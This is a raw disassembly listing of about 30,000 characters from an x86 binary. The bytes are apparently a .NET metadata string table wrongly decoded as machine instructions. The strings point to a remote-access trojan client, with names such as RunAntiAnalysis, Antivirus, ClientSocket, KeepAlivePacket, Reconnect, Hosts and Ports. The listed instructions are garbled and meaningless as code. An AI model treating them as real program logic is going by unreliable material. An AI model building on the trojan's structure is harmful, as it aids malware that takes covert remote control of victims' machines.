  408ae7:	66 63 32             	arpl   %si,(%edx)
  408aea:	38 39                	cmp    %bh,(%ecx)
  408aec:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408af0:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408af7:	73 00                	jae    0x408af9
  408af9:	52                   	push   %edx
  408afa:	65 61                	gs popa
  408afc:	64 41                	fs inc %ecx
  408afe:	6c                   	insb   (%dx),%es:(%edi)
  408aff:	6c                   	insb   (%dx),%es:(%edi)
  408b00:	42                   	inc    %edx
  408b01:	79 74                	jns    0x408b77
  408b03:	65 73 00             	gs jae 0x408b06
  408b06:	44                   	inc    %esp
  408b07:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408b0b:	65 46                	gs inc %esi
  408b0d:	72 6f                	jb     0x408b7e
  408b0f:	6d                   	insl   (%dx),%es:(%edi)
  408b10:	42                   	inc    %edx
  408b11:	79 74                	jns    0x408b87
  408b13:	65 73 00             	gs jae 0x408b16
  408b16:	53                   	push   %ebx
  408b17:	77 61                	ja     0x408b7a
  408b19:	70 42                	jo     0x408b5d
  408b1b:	79 74                	jns    0x408b91
  408b1d:	65 73 00             	gs jae 0x408b20
  408b20:	4c                   	dec    %esp
  408b21:	6f                   	outsl  %ds:(%esi),(%dx)
  408b22:	61                   	popa
  408b23:	64 46                	fs inc %esi
  408b25:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408b2c:	74 
  408b2d:	65 73 00             	gs jae 0x408b30
  408b30:	47                   	inc    %edi
  408b31:	65 74 41             	gs je  0x408b75
  408b34:	73 42                	jae    0x408b78
  408b36:	79 74                	jns    0x408bac
  408b38:	65 73 00             	gs jae 0x408b3b
  408b3b:	53                   	push   %ebx
  408b3c:	65 74 41             	gs je  0x408b80
  408b3f:	73 42                	jae    0x408b83
  408b41:	79 74                	jns    0x408bb7
  408b43:	65 73 00             	gs jae 0x408b46
  408b46:	47                   	inc    %edi
  408b47:	65 74 42             	gs je  0x408b8c
  408b4a:	79 74                	jns    0x408bc0
  408b4c:	65 73 00             	gs jae 0x408b4f
  408b4f:	4e                   	dec    %esi
  408b50:	65 78 74             	gs js  0x408bc7
  408b53:	42                   	inc    %edx
  408b54:	79 74                	jns    0x408bca
  408b56:	65 73 00             	gs jae 0x408b59
  408b59:	72 61                	jb     0x408bbc
  408b5b:	77 42                	ja     0x408b9f
  408b5d:	79 74                	jns    0x408bd3
  408b5f:	65 73 00             	gs jae 0x408b62
  408b62:	62 79 74             	bound  %edi,0x74(%ecx)
  408b65:	65 73 00             	gs jae 0x408b68
  408b68:	43                   	inc    %ebx
  408b69:	53                   	push   %ebx
  408b6a:	68 61 72 70 41       	push   $0x41707261
  408b6f:	72 67                	jb     0x408bd8
  408b71:	75 6d                	jne    0x408be0
  408b73:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b75:	74 49                	je     0x408bc0
  408b77:	6e                   	outsb  %ds:(%esi),(%dx)
  408b78:	66 6f                	outsw  %ds:(%esi),(%dx)
  408b7a:	46                   	inc    %esi
  408b7b:	6c                   	insb   (%dx),%es:(%edi)
  408b7c:	61                   	popa
  408b7d:	67 73 00             	addr16 jae 0x408b80
  408b80:	43                   	inc    %ebx
  408b81:	53                   	push   %ebx
  408b82:	68 61 72 70 42       	push   $0x42707261
  408b87:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408b8e:	61                   	popa
  408b8f:	67 73 00             	addr16 jae 0x408b92
  408b92:	65 73 46             	gs jae 0x408bdb
  408b95:	6c                   	insb   (%dx),%es:(%edi)
  408b96:	61                   	popa
  408b97:	67 73 00             	addr16 jae 0x408b9a
  408b9a:	53                   	push   %ebx
  408b9b:	74 72                	je     0x408c0f
  408b9d:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408ba4:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408bab:	65 
  408bac:	53                   	push   %ebx
  408bad:	65 74 74             	gs je  0x408c24
  408bb0:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408bb7:	73 73                	jae    0x408c2c
  408bb9:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408bc0:	6e                   	outsb  %ds:(%esi),(%dx)
  408bc1:	67 45                	addr16 inc %ebp
  408bc3:	76 65                	jbe    0x408c2a
  408bc5:	6e                   	outsb  %ds:(%esi),(%dx)
  408bc6:	74 41                	je     0x408c09
  408bc8:	72 67                	jb     0x408c31
  408bca:	73 00                	jae    0x408bcc
  408bcc:	41                   	inc    %ecx
  408bcd:	6e                   	outsb  %ds:(%esi),(%dx)
  408bce:	74 69                	je     0x408c39
  408bd0:	5f                   	pop    %edi
  408bd1:	41                   	inc    %ecx
  408bd2:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd3:	61                   	popa
  408bd4:	6c                   	insb   (%dx),%es:(%edi)
  408bd5:	79 73                	jns    0x408c4a
  408bd7:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408bde:	6e                   	outsb  %ds:(%esi),(%dx)
  408bdf:	74 69                	je     0x408c4a
  408be1:	41                   	inc    %ecx
  408be2:	6e                   	outsb  %ds:(%esi),(%dx)
  408be3:	61                   	popa
  408be4:	6c                   	insb   (%dx),%es:(%edi)
  408be5:	79 73                	jns    0x408c5a
  408be7:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408bee:	73 00                	jae    0x408bf0
  408bf0:	49                   	dec    %ecx
  408bf1:	43                   	inc    %ebx
  408bf2:	72 65                	jb     0x408c59
  408bf4:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408bf7:	74 69                	je     0x408c62
  408bf9:	61                   	popa
  408bfa:	6c                   	insb   (%dx),%es:(%edi)
  408bfb:	73 00                	jae    0x408bfd
  408bfd:	73 65                	jae    0x408c64
  408bff:	74 5f                	je     0x408c60
  408c01:	43                   	inc    %ebx
  408c02:	72 65                	jb     0x408c69
  408c04:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408c07:	74 69                	je     0x408c72
  408c09:	61                   	popa
  408c0a:	6c                   	insb   (%dx),%es:(%edi)
  408c0b:	73 00                	jae    0x408c0d
  408c0d:	45                   	inc    %ebp
  408c0e:	71 75                	jno    0x408c85
  408c10:	61                   	popa
  408c11:	6c                   	insb   (%dx),%es:(%edi)
  408c12:	73 00                	jae    0x408c14
  408c14:	53                   	push   %ebx
  408c15:	73 6c                	jae    0x408c83
  408c17:	50                   	push   %eax
  408c18:	72 6f                	jb     0x408c89
  408c1a:	74 6f                	je     0x408c8b
  408c1c:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408c1f:	73 00                	jae    0x408c21
  408c21:	52                   	push   %edx
  408c22:	65 61                	gs popa
  408c24:	64 54                	fs push %esp
  408c26:	6f                   	outsl  %ds:(%esi),(%dx)
  408c27:	6f                   	outsl  %ds:(%esi),(%dx)
  408c28:	6c                   	insb   (%dx),%es:(%edi)
  408c29:	73 00                	jae    0x408c2b
  408c2b:	57                   	push   %edi
  408c2c:	72 69                	jb     0x408c97
  408c2e:	74 65                	je     0x408c95
  408c30:	54                   	push   %esp
  408c31:	6f                   	outsl  %ds:(%esi),(%dx)
  408c32:	6f                   	outsl  %ds:(%esi),(%dx)
  408c33:	6c                   	insb   (%dx),%es:(%edi)
  408c34:	73 00                	jae    0x408c36
  408c36:	42                   	inc    %edx
  408c37:	79 74                	jns    0x408cad
  408c39:	65 73 54             	gs jae 0x408c90
  408c3c:	6f                   	outsl  %ds:(%esi),(%dx)
  408c3d:	6f                   	outsl  %ds:(%esi),(%dx)
  408c3e:	6c                   	insb   (%dx),%es:(%edi)
  408c3f:	73 00                	jae    0x408c41
  408c41:	53                   	push   %ebx
  408c42:	79 73                	jns    0x408cb7
  408c44:	74 65                	je     0x408cab
  408c46:	6d                   	insl   (%dx),%es:(%edi)
  408c47:	2e 57                	cs push %edi
  408c49:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408c50:	46                   	inc    %esi
  408c51:	6f                   	outsl  %ds:(%esi),(%dx)
  408c52:	72 6d                	jb     0x408cc1
  408c54:	73 00                	jae    0x408c56
  408c56:	44                   	inc    %esp
  408c57:	6e                   	outsb  %ds:(%esi),(%dx)
  408c58:	73 00                	jae    0x408c5a
  408c5a:	43                   	inc    %ebx
  408c5b:	6f                   	outsl  %ds:(%esi),(%dx)
  408c5c:	6e                   	outsb  %ds:(%esi),(%dx)
  408c5d:	74 61                	je     0x408cc0
  408c5f:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408c66:	74 65                	je     0x408ccd
  408c68:	6d                   	insl   (%dx),%es:(%edi)
  408c69:	2e 43                	cs inc %ebx
  408c6b:	6f                   	outsl  %ds:(%esi),(%dx)
  408c6c:	6c                   	insb   (%dx),%es:(%edi)
  408c6d:	6c                   	insb   (%dx),%es:(%edi)
  408c6e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408c73:	6e                   	outsb  %ds:(%esi),(%dx)
  408c74:	73 00                	jae    0x408c76
  408c76:	53                   	push   %ebx
  408c77:	74 72                	je     0x408ceb
  408c79:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  408c80:	74 4f                	je     0x408cd1
  408c82:	70 74                	jo     0x408cf8
  408c84:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  408c8b:	74 49                	je     0x408cd6
  408c8d:	6d                   	insl   (%dx),%es:(%edi)
  408c8e:	61                   	popa
  408c8f:	67 65 44             	addr16 gs inc %esp
  408c92:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408c96:	65 72 73             	gs jb  0x408d0c
  408c99:	00 52 75             	add    %dl,0x75(%edx)
  408c9c:	6e                   	outsb  %ds:(%esi),(%dx)
  408c9d:	74 69                	je     0x408d08
  408c9f:	6d                   	insl   (%dx),%es:(%edi)
  408ca0:	65 48                	gs dec %eax
  408ca2:	65 6c                	gs insb (%dx),%es:(%edi)
  408ca4:	70 65                	jo     0x408d0b
  408ca6:	72 73                	jb     0x408d1b
  408ca8:	00 53 73             	add    %dl,0x73(%ebx)
  408cab:	6c                   	insb   (%dx),%es:(%edi)
  408cac:	50                   	push   %eax
  408cad:	6f                   	outsl  %ds:(%esi),(%dx)
  408cae:	6c                   	insb   (%dx),%es:(%edi)
  408caf:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  408cb6:	72 73                	jb     0x408d2b
  408cb8:	00 73 73             	add    %dh,0x73(%ebx)
  408cbb:	6c                   	insb   (%dx),%es:(%edi)
  408cbc:	50                   	push   %eax
  408cbd:	6f                   	outsl  %ds:(%esi),(%dx)
  408cbe:	6c                   	insb   (%dx),%es:(%edi)
  408cbf:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  408cc6:	72 73                	jb     0x408d3b
  408cc8:	00 46 69             	add    %al,0x69(%esi)
  408ccb:	6c                   	insb   (%dx),%es:(%edi)
  408ccc:	65 41                	gs inc %ecx
  408cce:	63 63 65             	arpl   %esp,0x65(%ebx)
  408cd1:	73 73                	jae    0x408d46
  408cd3:	00 68 50             	add    %ch,0x50(%eax)
  408cd6:	72 6f                	jb     0x408d47
  408cd8:	63 65 73             	arpl   %esp,0x73(%ebp)
  408cdb:	73 00                	jae    0x408cdd
  408cdd:	47                   	inc    %edi
  408cde:	65 74 50             	gs je  0x408d31
  408ce1:	72 6f                	jb     0x408d52
  408ce3:	63 65 73             	arpl   %esp,0x73(%ebp)
  408ce6:	73 00                	jae    0x408ce8
  408ce8:	47                   	inc    %edi
  408ce9:	65 74 43             	gs je  0x408d2f
  408cec:	75 72                	jne    0x408d60
  408cee:	72 65                	jb     0x408d55
  408cf0:	6e                   	outsb  %ds:(%esi),(%dx)
  408cf1:	74 50                	je     0x408d43
  408cf3:	72 6f                	jb     0x408d64
  408cf5:	63 65 73             	arpl   %esp,0x73(%ebp)
  408cf8:	73 00                	jae    0x408cfa
  408cfa:	70 72                	jo     0x408d6e
  408cfc:	6f                   	outsl  %ds:(%esi),(%dx)
  408cfd:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d00:	73 00                	jae    0x408d02
  408d02:	49                   	dec    %ecx
  408d03:	50                   	push   %eax
  408d04:	41                   	inc    %ecx
  408d05:	64 64 72 65          	fs fs jb 0x408d6e
  408d09:	73 73                	jae    0x408d7e
  408d0b:	00 43 6f             	add    %al,0x6f(%ebx)
  408d0e:	6d                   	insl   (%dx),%es:(%edi)
  408d0f:	70 72                	jo     0x408d83
  408d11:	65 73 73             	gs jae 0x408d87
  408d14:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  408d18:	6f                   	outsl  %ds:(%esi),(%dx)
  408d19:	6d                   	insl   (%dx),%es:(%edi)
  408d1a:	70 72                	jo     0x408d8e
  408d1c:	65 73 73             	gs jae 0x408d92
  408d1f:	00 53 79             	add    %dl,0x79(%ebx)
  408d22:	73 74                	jae    0x408d98
  408d24:	65 6d                	gs insl (%dx),%es:(%edi)
  408d26:	2e 4e                	cs dec %esi
  408d28:	65 74 2e             	gs je  0x408d59
  408d2b:	53                   	push   %ebx
  408d2c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d2d:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408d30:	74 73                	je     0x408da5
  408d32:	00 73 65             	add    %dh,0x65(%ebx)
  408d35:	74 5f                	je     0x408d96
  408d37:	41                   	inc    %ecx
  408d38:	72 67                	jb     0x408da1
  408d3a:	75 6d                	jne    0x408da9
  408d3c:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d3e:	74 73                	je     0x408db3
  408d40:	00 53 79             	add    %dl,0x79(%ebx)
  408d43:	73 74                	jae    0x408db9
  408d45:	65 6d                	gs insl (%dx),%es:(%edi)
  408d47:	45                   	inc    %ebp
  408d48:	76 65                	jbe    0x408daf
  408d4a:	6e                   	outsb  %ds:(%esi),(%dx)
  408d4b:	74 73                	je     0x408dc0
  408d4d:	00 50 6f             	add    %dl,0x6f(%eax)
  408d50:	72 74                	jb     0x408dc6
  408d52:	73 00                	jae    0x408d54
  408d54:	45                   	inc    %ebp
  408d55:	78 69                	js     0x408dc0
  408d57:	73 74                	jae    0x408dcd
  408d59:	73 00                	jae    0x408d5b
  408d5b:	48                   	dec    %eax
  408d5c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d5d:	73 74                	jae    0x408dd3
  408d5f:	73 00                	jae    0x408d61
  408d61:	41                   	inc    %ecx
  408d62:	6e                   	outsb  %ds:(%esi),(%dx)
  408d63:	74 69                	je     0x408dce
  408d65:	76 69                	jbe    0x408dd0
  408d67:	72 75                	jb     0x408dde
  408d69:	73 00                	jae    0x408d6b
  408d6b:	43                   	inc    %ebx
  408d6c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d6d:	6e                   	outsb  %ds:(%esi),(%dx)
  408d6e:	63 61 74             	arpl   %esp,0x74(%ecx)
  408d71:	00 49 6d             	add    %cl,0x6d(%ecx)
  408d74:	61                   	popa
  408d75:	67 65 46             	addr16 gs inc %esi
  408d78:	6f                   	outsl  %ds:(%esi),(%dx)
  408d79:	72 6d                	jb     0x408de8
  408d7b:	61                   	popa
  408d7c:	74 00                	je     0x408d7e
  408d7e:	66 6f                	outsw  %ds:(%esi),(%dx)
  408d80:	72 6d                	jb     0x408def
  408d82:	61                   	popa
  408d83:	74 00                	je     0x408d85
  408d85:	57                   	push   %edi
  408d86:	72 69                	jb     0x408df1
  408d88:	74 65                	je     0x408def
  408d8a:	46                   	inc    %esi
  408d8b:	6c                   	insb   (%dx),%es:(%edi)
  408d8c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d8d:	61                   	popa
  408d8e:	74 00                	je     0x408d90
  408d90:	67 65 74 5f          	addr16 gs je 0x408df3
  408d94:	41                   	inc    %ecx
  408d95:	73 46                	jae    0x408ddd
  408d97:	6c                   	insb   (%dx),%es:(%edi)
  408d98:	6f                   	outsl  %ds:(%esi),(%dx)
  408d99:	61                   	popa
  408d9a:	74 00                	je     0x408d9c
  408d9c:	73 65                	jae    0x408e03
  408d9e:	74 5f                	je     0x408dff
  408da0:	41                   	inc    %ecx
  408da1:	73 46                	jae    0x408de9
  408da3:	6c                   	insb   (%dx),%es:(%edi)
  408da4:	6f                   	outsl  %ds:(%esi),(%dx)
  408da5:	61                   	popa
  408da6:	74 00                	je     0x408da8
  408da8:	47                   	inc    %edi
  408da9:	65 74 41             	gs je  0x408ded
  408dac:	73 46                	jae    0x408df4
  408dae:	6c                   	insb   (%dx),%es:(%edi)
  408daf:	6f                   	outsl  %ds:(%esi),(%dx)
  408db0:	61                   	popa
  408db1:	74 00                	je     0x408db3
  408db3:	53                   	push   %ebx
  408db4:	65 74 41             	gs je  0x408df8
  408db7:	73 46                	jae    0x408dff
  408db9:	6c                   	insb   (%dx),%es:(%edi)
  408dba:	6f                   	outsl  %ds:(%esi),(%dx)
  408dbb:	61                   	popa
  408dbc:	74 00                	je     0x408dbe
  408dbe:	46                   	inc    %esi
  408dbf:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  408dc6:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  408dca:	61                   	popa
  408dcb:	6e                   	outsb  %ds:(%esi),(%dx)
  408dcc:	61                   	popa
  408dcd:	67 65 6d             	gs insl (%dx),%es:(%di)
  408dd0:	65 6e                	outsb  %gs:(%esi),(%dx)
  408dd2:	74 42                	je     0x408e16
  408dd4:	61                   	popa
  408dd5:	73 65                	jae    0x408e3c
  408dd7:	4f                   	dec    %edi
  408dd8:	62 6a 65             	bound  %ebp,0x65(%edx)
  408ddb:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  408ddf:	6f                   	outsl  %ds:(%esi),(%dx)
  408de0:	72 63                	jb     0x408e45
  408de2:	65 50                	gs push %eax
  408de4:	61                   	popa
  408de5:	74 68                	je     0x408e4f
  408de7:	4f                   	dec    %edi
  408de8:	62 6a 65             	bound  %ebp,0x65(%edx)
  408deb:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  408def:	6f                   	outsl  %ds:(%esi),(%dx)
  408df0:	6c                   	insb   (%dx),%es:(%edi)
  408df1:	6c                   	insb   (%dx),%es:(%edi)
  408df2:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  408df7:	6f                   	outsl  %ds:(%esi),(%dx)
  408df8:	6e                   	outsb  %ds:(%esi),(%dx)
  408df9:	6e                   	outsb  %ds:(%esi),(%dx)
  408dfa:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  408dff:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  408e03:	6e                   	outsb  %ds:(%esi),(%dx)
  408e04:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  408e09:	65 74 00             	gs je  0x408e0c
  408e0c:	53                   	push   %ebx
  408e0d:	79 73                	jns    0x408e82
  408e0f:	74 65                	je     0x408e76
  408e11:	6d                   	insl   (%dx),%es:(%edi)
  408e12:	2e 4e                	cs dec %esi
  408e14:	65 74 00             	gs je  0x408e17
  408e17:	53                   	push   %ebx
  408e18:	65 74 00             	gs je  0x408e1b
  408e1b:	54                   	push   %esp
  408e1c:	61                   	popa
  408e1d:	72 67                	jb     0x408e86
  408e1f:	65 74 00             	gs je  0x408e22
  408e22:	43                   	inc    %ebx
  408e23:	6c                   	insb   (%dx),%es:(%edi)
  408e24:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  408e2b:	6e                   	outsb  %ds:(%esi),(%dx)
  408e2c:	64 6c                	fs insb (%dx),%es:(%edi)
  408e2e:	65 5f                	gs pop %edi
  408e30:	50                   	push   %eax
  408e31:	61                   	popa
  408e32:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408e35:	74 00                	je     0x408e37
  408e37:	4b                   	dec    %ebx
  408e38:	65 65 70 41          	gs gs jo 0x408e7d
  408e3c:	6c                   	insb   (%dx),%es:(%edi)
  408e3d:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  408e44:	65 74 00             	gs je  0x408e47
  408e47:	43                   	inc    %ebx
  408e48:	6c                   	insb   (%dx),%es:(%edi)
  408e49:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  408e50:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  408e54:	53                   	push   %ebx
  408e55:	79 73                	jns    0x408eca
  408e57:	74 65                	je     0x408ebe
  408e59:	6d                   	insl   (%dx),%es:(%edi)
  408e5a:	2e 43                	cs inc %ebx
  408e5c:	6f                   	outsl  %ds:(%esi),(%dx)
  408e5d:	6c                   	insb   (%dx),%es:(%edi)
  408e5e:	6c                   	insb   (%dx),%es:(%edi)
  408e5f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408e64:	6e                   	outsb  %ds:(%esi),(%dx)
  408e65:	73 2e                	jae    0x408e95
  408e67:	49                   	dec    %ecx
  408e68:	45                   	inc    %ebp
  408e69:	6e                   	outsb  %ds:(%esi),(%dx)
  408e6a:	75 6d                	jne    0x408ed9
  408e6c:	65 72 61             	gs jb  0x408ed0
  408e6f:	74 6f                	je     0x408ee0
  408e71:	72 2e                	jb     0x408ea1
  408e73:	52                   	push   %edx
  408e74:	65 73 65             	gs jae 0x408edc
  408e77:	74 00                	je     0x408e79
  408e79:	67 65 74 5f          	addr16 gs je 0x408edc
  408e7d:	4f                   	dec    %edi
  408e7e:	66 66 73 65          	data16 data16 jae 0x408ee7
  408e82:	74 00                	je     0x408e84
  408e84:	73 65                	jae    0x408eeb
  408e86:	74 5f                	je     0x408ee7
  408e88:	4f                   	dec    %edi
  408e89:	66 66 73 65          	data16 data16 jae 0x408ef2
  408e8d:	74 00                	je     0x408e8f
  408e8f:	53                   	push   %ebx
  408e90:	70 6c                	jo     0x408efe
  408e92:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  408e99:	6e 
  408e9a:	74 45                	je     0x408ee1
  408e9c:	78 69                	js     0x408f07
  408e9e:	74 00                	je     0x408ea0
  408ea0:	53                   	push   %ebx
  408ea1:	61                   	popa
  408ea2:	6c                   	insb   (%dx),%es:(%edi)
  408ea3:	74 00                	je     0x408ea5
  408ea5:	53                   	push   %ebx
  408ea6:	69 6e 67 6c 65 4f 72 	imul   $0x724f656c,0x67(%esi),%ebp
  408ead:	44                   	inc    %esp
  408eae:	65 66 61             	gs popaw
  408eb1:	75 6c                	jne    0x408f1f
  408eb3:	74 00                	je     0x408eb5
  408eb5:	49                   	dec    %ecx
  408eb6:	41                   	inc    %ecx
  408eb7:	73 79                	jae    0x408f32
  408eb9:	6e                   	outsb  %ds:(%esi),(%dx)
  408eba:	63 52 65             	arpl   %edx,0x65(%edx)
  408ebd:	73 75                	jae    0x408f34
  408ebf:	6c                   	insb   (%dx),%es:(%edi)
  408ec0:	74 00                	je     0x408ec2
  408ec2:	54                   	push   %esp
  408ec3:	6f                   	outsl  %ds:(%esi),(%dx)
  408ec4:	55                   	push   %ebp
  408ec5:	70 70                	jo     0x408f37
  408ec7:	65 72 49             	gs jb  0x408f13
  408eca:	6e                   	outsb  %ds:(%esi),(%dx)
  408ecb:	76 61                	jbe    0x408f2e
  408ecd:	72 69                	jb     0x408f38
  408ecf:	61                   	popa
  408ed0:	6e                   	outsb  %ds:(%esi),(%dx)
  408ed1:	74 00                	je     0x408ed3
  408ed3:	57                   	push   %edi
  408ed4:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  408ed8:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  408edf:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408ee6:	65 
  408ee7:	43                   	inc    %ebx
  408ee8:	6c                   	insb   (%dx),%es:(%edi)
  408ee9:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  408ef0:	74 5f                	je     0x408f51
  408ef2:	53                   	push   %ebx
  408ef3:	73 6c                	jae    0x408f61
  408ef5:	43                   	inc    %ebx
  408ef6:	6c                   	insb   (%dx),%es:(%edi)
  408ef7:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  408efe:	74 5f                	je     0x408f5f
  408f00:	53                   	push   %ebx
  408f01:	73 6c                	jae    0x408f6f
  408f03:	43                   	inc    %ebx
  408f04:	6c                   	insb   (%dx),%es:(%edi)
  408f05:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  408f0c:	74 5f                	je     0x408f6d
  408f0e:	54                   	push   %esp
  408f0f:	63 70 43             	arpl   %esi,0x43(%eax)
  408f12:	6c                   	insb   (%dx),%es:(%edi)
  408f13:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  408f1a:	74 5f                	je     0x408f7b
  408f1c:	54                   	push   %esp
  408f1d:	63 70 43             	arpl   %esi,0x43(%eax)
  408f20:	6c                   	insb   (%dx),%es:(%edi)
  408f21:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  408f28:	74 68                	je     0x408f92
  408f2a:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f2c:	74 69                	je     0x408f97
  408f2e:	63 61 74             	arpl   %esp,0x74(%ecx)
  408f31:	65 41                	gs inc %ecx
  408f33:	73 43                	jae    0x408f78
  408f35:	6c                   	insb   (%dx),%es:(%edi)
  408f36:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  408f3d:	73 74                	jae    0x408fb3
  408f3f:	65 6d                	gs insl (%dx),%es:(%edi)
  408f41:	2e 4d                	cs dec %ebp
  408f43:	61                   	popa
  408f44:	6e                   	outsb  %ds:(%esi),(%dx)
  408f45:	61                   	popa
  408f46:	67 65 6d             	gs insl (%dx),%es:(%di)
  408f49:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f4b:	74 00                	je     0x408f4d
  408f4d:	45                   	inc    %ebp
  408f4e:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4f:	76 69                	jbe    0x408fba
  408f51:	72 6f                	jb     0x408fc2
  408f53:	6e                   	outsb  %ds:(%esi),(%dx)
  408f54:	6d                   	insl   (%dx),%es:(%edi)
  408f55:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f57:	74 00                	je     0x408f59
  408f59:	70 61                	jo     0x408fbc
  408f5b:	72 65                	jb     0x408fc2
  408f5d:	6e                   	outsb  %ds:(%esi),(%dx)
  408f5e:	74 00                	je     0x408f60
  408f60:	53                   	push   %ebx
  408f61:	79 73                	jns    0x408fd6
  408f63:	74 65                	je     0x408fca
  408f65:	6d                   	insl   (%dx),%es:(%edi)
  408f66:	2e 43                	cs inc %ebx
  408f68:	6f                   	outsl  %ds:(%esi),(%dx)
  408f69:	6c                   	insb   (%dx),%es:(%edi)
  408f6a:	6c                   	insb   (%dx),%es:(%edi)
  408f6b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408f70:	6e                   	outsb  %ds:(%esi),(%dx)
  408f71:	73 2e                	jae    0x408fa1
  408f73:	49                   	dec    %ecx
  408f74:	45                   	inc    %ebp
  408f75:	6e                   	outsb  %ds:(%esi),(%dx)
  408f76:	75 6d                	jne    0x408fe5
  408f78:	65 72 61             	gs jb  0x408fdc
  408f7b:	74 6f                	je     0x408fec
  408f7d:	72 2e                	jb     0x408fad
  408f7f:	43                   	inc    %ebx
  408f80:	75 72                	jne    0x408ff4
  408f82:	72 65                	jb     0x408fe9
  408f84:	6e                   	outsb  %ds:(%esi),(%dx)
  408f85:	74 00                	je     0x408f87
  408f87:	53                   	push   %ebx
  408f88:	79 73                	jns    0x408ffd
  408f8a:	74 65                	je     0x408ff1
  408f8c:	6d                   	insl   (%dx),%es:(%edi)
  408f8d:	2e 43                	cs inc %ebx
  408f8f:	6f                   	outsl  %ds:(%esi),(%dx)
  408f90:	6c                   	insb   (%dx),%es:(%edi)
  408f91:	6c                   	insb   (%dx),%es:(%edi)
  408f92:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408f97:	6e                   	outsb  %ds:(%esi),(%dx)
  408f98:	73 2e                	jae    0x408fc8
  408f9a:	49                   	dec    %ecx
  408f9b:	45                   	inc    %ebp
  408f9c:	6e                   	outsb  %ds:(%esi),(%dx)
  408f9d:	75 6d                	jne    0x40900c
  408f9f:	65 72 61             	gs jb  0x409003
  408fa2:	74 6f                	je     0x409013
  408fa4:	72 2e                	jb     0x408fd4
  408fa6:	67 65 74 5f          	addr16 gs je 0x409009
  408faa:	43                   	inc    %ebx
  408fab:	75 72                	jne    0x40901f
  408fad:	72 65                	jb     0x409014
  408faf:	6e                   	outsb  %ds:(%esi),(%dx)
  408fb0:	74 00                	je     0x408fb2
  408fb2:	47                   	inc    %edi
  408fb3:	65 74 43             	gs je  0x408ff9
  408fb6:	75 72                	jne    0x40902a
  408fb8:	72 65                	jb     0x40901f
  408fba:	6e                   	outsb  %ds:(%esi),(%dx)
  408fbb:	74 00                	je     0x408fbd
  408fbd:	43                   	inc    %ebx
  408fbe:	68 65 63 6b 52       	push   $0x526b6365
  408fc3:	65 6d                	gs insl (%dx),%es:(%edi)
